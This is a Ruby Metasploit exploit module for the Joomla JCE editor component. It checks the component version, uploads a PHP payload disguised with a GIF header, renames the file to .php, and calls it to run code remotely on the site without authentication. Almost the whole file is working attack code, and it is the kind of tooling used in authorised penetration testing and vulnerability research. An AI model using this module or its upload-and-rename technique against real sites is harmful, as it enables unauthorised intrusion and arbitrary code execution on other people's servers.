##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Component JCE File Upload Remote Code Execution',
      'Description'    => %q{
          This module exploits a vulnerability  in the JCE component for Joomla!, which
      could allow an unauthenticated remote attacker to upload arbitrary files, caused by the
      fails to sufficiently sanitize user-supplied input. Sending specially-crafted HTTP
      request, a remote attacker could exploit this vulnerability to upload a malicious PHP
      script, which could allow the attacker to execute arbitrary PHP code on the vulnerable
      system. This module has been tested successfully on the JCE Editor 1.5.71 and Joomla
      1.5.26.
      },
      'Author'         =>
        [
          'Unknown', # From AmnPardaz Security Group # Vulnerability discovery and PoC
          'Heyder Andrade <eu[at]heyderandrade.org>' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['BID', '49338'],
          ['EDB', '17734']
        ],
      'Payload'        =>
        {
          'Space'       => 4000, # only to prevent error HTTP 414 (Request-URI Too Long)
          'DisableNops' => true,
          'BadChars'    => "#",
          'Keys'        => ['php']
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 2 2012',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, "Joomla directory path", "/"])
        ], self.class)
  end


  def get_version
    # check imgmanager version
    @uri_base     = normalize_uri(target_uri.path.to_s, 'index.php')
    @vars_get_base   =    {
      'option'=> 'com_jce',
      'task'  => 'plugin',
      'plugin'=> 'imgmanager',
      'file'  => 'imgmanager'
    }
    print_status("Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}")
    res = send_request_cgi({
      'uri'     => @uri_base,
      'vars_get' => @vars_get_base,
      'method'  => 'GET',
      'version' => '1.1'
    })

    version = nil
    if (res and res.code == 200)
      res.body.match(%r{^\s+?<title>Image\sManager\s:\s?(.*)<})
      version = $1.nil? ? nil : $1
    end

    return version
  end

  def check
    version = ( get_version || '').to_s

    if (version.match(%r{1\.5\.7\.1[0-4]?}))
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end


  def upload_gif
    # add GIF header
    cmd_php = "GIF89aG\n<?php #{payload.encoded}  ?>"

    # Generate some random strings
    @payload_name    = rand_text_alpha_lower(6)
    boundary       = '-' * 27 + rand_text_numeric(11)

    parms       = {'method'=> 'form'}
    parms.merge!(@vars_get_base)

    # POST data
    post_data = Rex::MIME::Message.new
    post_data.bound = boundary
    post_data.add_part("/", nil, nil, "form-data; name=\"upload-dir\"")
    post_data.add_part("", "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"\"")
    post_data.add_part("0", nil, nil, "form-data; name=\"upload-overwrite\"")
    post_data.add_part("#{cmd_php}", "image/gif", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}.gif\"")
    post_data.add_part("#{@payload_name}", nil, nil, "form-data; name=\"upload-name\"")
    post_data.add_part("upload", nil, nil, "form-data; name=\"action\"")

    data = post_data.to_s

    res = send_request_cgi({
      'uri'      => @uri_base,
      'vars_get'   => parms,
      'method'    => 'POST',
      'version'   => '1.1',
      'data'      => data,
      'ctype'    => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if (res and res.code = 200 )
      return :access_denied if (res.body =~ /RESTRICTED/i)
      print_good("Successfully uploaded #{@payload_name}.gif")
    else
      print_error("Error uploading #{@payload_name}.gif")
      return :abort
    end

    return :success

  end

  def renamed?
    # Rename the file from .gif to .php

    data =  "json={\"fn\":\"folderRename\",\"args\":[\"/#{@payload_name}.gif\",\"#{@payload_name}.php\"]}"

    print_status("Change Extension from #{@payload_name}.gif to #{@payload_name}.php")

    res = send_request_cgi(
      {
        'uri'       => @uri_base,
        'vars_get'  => @vars_get_base,
        'method'    => 'POST',
        'version'   => '1.1',
        'data'       => data,
        'ctype'     => 'application/x-www-form-urlencoded; charset=utf-8',
        'headers'   =>
        {
          'X-Request' => 'JSON'
        }
      })
    if (res and res.code == 200 )
      print_good("Renamed #{@payload_name}.gif to #{@payload_name}.php")
      return true
    else
      print_error("Failed to rename #{@payload_name}.gif to #{@payload_name}.php")
      return false
    end
  end

  def call_payload
    payload = "#{@payload_name}.php"
    print_status("Calling payload: #{payload}")
    uri = normalize_uri(target_uri.path.to_s, "images", "stories", payload)
    res = send_request_cgi({
      'uri'  => uri,
      'method'    => 'GET',
      'version'   => '1.1'
    })
  end



  def exploit

    return if not check == Exploit::CheckCode::Vulnerable
    if upload_gif == :success
      if renamed?
        register_files_for_cleanup("#{@payload_name}.php")
        call_payload
      end
    end

  end

end

